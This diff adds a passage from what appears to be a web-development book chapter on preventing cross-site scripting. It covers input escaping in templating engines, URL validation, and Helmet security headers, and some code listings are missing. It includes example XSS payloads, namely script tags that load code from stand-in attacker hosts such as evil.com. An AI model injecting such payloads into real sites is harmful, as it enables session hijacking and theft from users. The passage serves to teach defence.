@@ -1,0 +1,55 @@
+
+I probably shouldn't say this, but there are a lot of ways you could steal my money. You could beat me up and rob me, you could threaten me, or you could pickpocket me. If you were a hacker, you could also hack into my bank and wire a bunch of my money to you (and of all the options we listed, this is the one I most prefer).
+
+If you could get control of my browser, even if you didn't know my password, you could still get my money.  You could wait for me to log in, and then take control of my browser.  You'd tell my browser to go to the "wire money" page on my bank and take a large sum of money. If you were clever, you could hide it so that I'd never even know it happened (until, of course, all of my money was gone).
+
+But how would you get control of my browser? Perhaps the most popular way would be through use of a cross-site scripting attack, also known as an XSS attack.
+
+Imagine that, on my bank's homepage, I can see a list of my contacts and their names.
+
+Figure 10.2  A fictional list of my bank contacts.
+
+Users have control over their names. Bruce Lee can go into his settings and change his name to "Bruce Springsteen" if he wants to. But what if he changed his name to this:
+
+The list of contacts would still show up the same, but now my web browser will also execute the code inside the <script> tag! Presumably, this will transfer a million dollars to Bruce Lee's account, and I'll never be the wiser. Bruce Lee could also add <script src="http://brucelee.biz/hacker.js"></script> to his name. This script could send data (like login information, for example) to brucelee.biz.
+
+There's one big way to prevent XSS: never blindly trust user input.
+
+Escaping user input
+
+When you have user input, it's almost always possible that they'll enter something malicious. In the example above, you could set your name to contain <script> tags, causing XSS issues. We can sanitize or "escape" user input, so that when we put it into our HTML, we aren't doing anything unexpected.
+
+Depending on where you're putting the user input, you'll sanitize things differently. As a general principle, you'll want to sanitize things as much as you can, and always keep the context in mind.
+
+For example, if you're putting some user content inside of HTML tags, you'll want to make sure that it can't define any HTML tags. You'll want this kind of string:
+
+To become something like this:
+
+By doing that, the script tags will be rendered useless.
+
+This kind of escaping (and more) is handled by most templating engines for you. In EJS, simply use the default <%= myString %> and don't use the <%- userString %>. In Jade, this escaping is done by default. Unless you're certain that you don't want to sanitize something, make sure to use the "safe" version whenever you're dealing with user strings.
+
+If you know that the user should be entering a URL, you'll want to do more than just escaping; you'll want to do your best to validate that something is a URL. You'll also want to call the built-in encodeURI function on a URL to make sure it's safe.
+
+If you're putting something inside of an HTML attribute, you'll want to make sure your users can't put quotation marks, for example. Unfortunately, there isn't a one-size-fits-all solution for sanitizing user input; the way you sanitize depends on the context. But you should always sanitize user input as much as you can.
+
+You can also escape the input before you ever put it into your database. In the examples above, we're showing how to sanitize things whenever we're displaying them. But if you know that your users should enter homepages on their user profiles, it's also useful to sanitize that before you ever store it in the database. If I enter "hello, world" as my homepage, the server should give an error. If I enter http://evanhahn.com as my homepage, that should be allowed, and put into the database. This can have security benefits and user interface benefits.
+
+Mitigating XSS with HTTP headers
+
+There's one other way to help mitigate XSS, but it's quite small, and that's through the use of HTTP headers. Once again, we'll break out Helmet.
+
+There's a simple security header called X-XSS-Protection. It can't protect against all kinds of XSS, but it can protect against what's called "reflected XSS". The best example of reflected XSS is on an insecure search engine. On every search engine, when you do a search, your query appears on the screen (usually at the top). If you search for "candy", the word "candy" will appear at the top, and it'll be part of the URL:
+
+Now imagine you're searching "<script src="http://evil.com/hack.js"></script>". The URL might look something like this:
+
+Now, if this search engine puts that query into the HTML of the page, you've injected a script into the page! If I send this URL to you and you click the link, I can take control and do malicious things.
+
+The first step against this attack is to sanitize the user's input. After that, you can set a the X-XSS-Protection header to keep some browsers from running that script should you make a mistake. In Helmet, it's just one line:
+
+Listing 10.9  Using Helmet to set the X-XSS-Protection header
+
+Helmet also lets you set another header called Content Security Policy. Frankly, Content Security Policy could be its own chapter. Check out the HTML5 Rocks guide at http://www.html5rocks.com/en/tutorials/security/content-security-policy/ for more information, and once you understand it, use Helmet's csp middleware.
+
+Neither of these Helmet headers are anywhere near as important as sanitizing user input, so do those first!
+Preventing cross-site scripting attacks (XSS)
